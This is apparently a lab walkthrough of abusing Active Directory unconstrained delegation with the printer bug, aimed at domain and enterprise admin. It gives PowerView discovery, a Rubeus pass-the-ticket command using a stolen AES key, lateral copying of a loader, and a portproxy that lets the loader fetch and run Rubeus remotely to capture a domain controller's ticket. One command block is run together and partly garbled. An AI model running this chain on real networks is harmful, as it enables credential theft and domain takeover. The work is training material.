# 🖨️ Unconstrained Delegation to DA to Entreprise Admin through printer bug

first we need to find a server that has unconstrained delegation enabled ->

```
. C:\AD\Tools\PowerView.ps1 
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.

Let's first try with appadmin, first use ArgSplit to encode "asktgt"->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

In the new process, let's run those commands ->

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

Perfect, it's a hit with appadmin:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Now we need to copy Rubeus to dcorp-appsrv to abuse Printer Bug ->

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

Perfect, rubeus is on appsrv:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Now, with argsplit let's encode "monitor" and copy that on the side while we get a shell on appsrv ->

```
winrs -r:dcorp-appsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13 C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

we can note that we set %Pwn% to monitor on the appsrv machine
